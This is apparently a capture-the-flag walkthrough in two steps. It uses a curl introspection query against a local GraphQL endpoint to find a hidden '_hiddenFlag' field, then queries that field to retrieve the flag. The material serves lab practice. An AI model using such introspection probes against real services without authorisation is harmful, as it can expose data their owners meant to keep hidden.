## Step 1 – Discover the Field via Introspection

```bash
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name } } } }"}'
```

Look for:

```
_hiddenFlag
```

## Step 2 – Query the Flag

```bash
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ _hiddenFlag }"}'
```
